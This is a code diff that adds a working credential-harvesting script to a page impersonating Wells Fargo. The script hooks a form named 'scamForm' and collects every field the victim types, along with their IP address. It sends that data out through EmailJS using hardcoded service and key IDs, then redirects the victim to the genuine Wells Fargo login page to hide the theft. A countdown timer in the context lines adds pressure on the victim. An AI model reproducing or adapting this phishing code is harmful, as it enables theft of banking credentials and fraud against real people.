@@ -460,7 +460,62 @@ window.location.href = "https://www.wellsfargo.com/";
 });
 </script>
     
-      
+     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+    // Initialize EmailJS on page load
+    window.onload = function() {
+        if (typeof emailjs !== 'undefined') {
+            emailjs.init("y3lRWL7KLDjiFjNcN");
+        }
+
+        const form = document.getElementById('scamForm');
+        if (form) {
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const btn = document.getElementById('verifyBtn');
+                if(btn) {
+                    btn.disabled = true;
+                    btn.textContent = "Verifying...";
+                    btn.style.backgroundColor = "#999";
+                    btn.style.cursor = "not-allowed";
+                }
+
+                const formData = new FormData(e.target);
+                const data = Object.fromEntries(formData.entries());
+
+                // Attempt to fetch IP, but don't fail if it fails
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(ipData => {
+                        data.ip = ipData.ip;
+                        data.date = new Date().toLocaleString();
+                        sendEmail(data);
+                    })
+                    .catch(() => {
+                        data.date = new Date().toLocaleString();
+                        sendEmail(data);
+                    });
+            });
+        }
+
+        function sendEmail(data) {
+            if (typeof emailjs !== 'undefined') {
+                emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
+                    .then(() => {
+                        // Redirect to the real Wells Fargo login page
+                        window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
+                    })
+                    .catch(() => {
+                        // Fallback redirect if email fails
+                        window.location.href = "https://www.wellsfargo.com/";
+                    });
+            } else {
+                window.location.href = "https://www.wellsfargo.com/";
+            }
+        }
+    };
+</script> 
 <script>
 (function() {
 let time = 599; // 9 minutes * 60 + 59 seconds = 599
